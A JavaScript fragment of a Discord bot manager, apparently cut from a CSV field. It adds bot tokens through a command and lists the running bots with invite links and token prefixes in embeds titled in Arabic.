  if (command === ""addtoken"") {
    const newToken = args[1];
    if (!newToken) return message.reply(""ex: addtoken [token_bot]"");
    const tokens = loadTokens();
    if (tokens.includes(newToken)) return message.react(""❌"");
    tokens.push(newToken);
    saveTokens(tokens);
    startBot(newToken);
    message.react(""✅"");
  }

  const failedTokens =[];
  if (command === ""info-tokens"") {
      const descriptionLines = [];

      bots.forEach(bot => {
        const nameTag = bot.user?.tag || ""Unknown#0000"";
        const _1 = bot.user?.id || ""1"";
        const tokenPreview = bot.token?.slice(0, 10) || ""??????????"";
        descriptionLines.push(
          `[${nameTag}](https://discord.com/oauth2/authorize?client_id=${_1}&permissions=0&integration_type=0&scope=bot) [token: ${tokenPreview}...]`
        );
      });
      
      if (failedTokens.length > 0) {
        failedTokens.forEach(t => {
          descriptionLines.push(`[FAILED] [token: ${t.slice(0, 10)}...] ❌`);
        });
      }
      
      
      const MAX_LENGTH = 4000;
      const embeds = [];
      let lines = [];
      let length = 0;
      
      for (const line of descriptionLines) {
        const lineLength = line.length + 1;
        if (length + lineLength > MAX_LENGTH) {
          embeds.push(
            new EmbedBuilder()
              .setTitle(""حالة التوكنات"")
              .setDescription(lines.join(""\n""))
              .setColor(""Blue"")
          );
          lines = [];
          length = 0;
        }
      
        lines.push(line);
        length += lineLength;
      }
      
      if (lines.length > 0) {
        embeds.push(
          new EmbedBuilder()
            .setTitle(""حالة التوكنات"")
            .setDescription(lines.join(""\n""))
            .setColor(""Blue"")
        );
      }
      
      
      for (const embed of embeds) {
        await message.channel.send({ embeds: [embed] });
      }
 }

    
    
});"
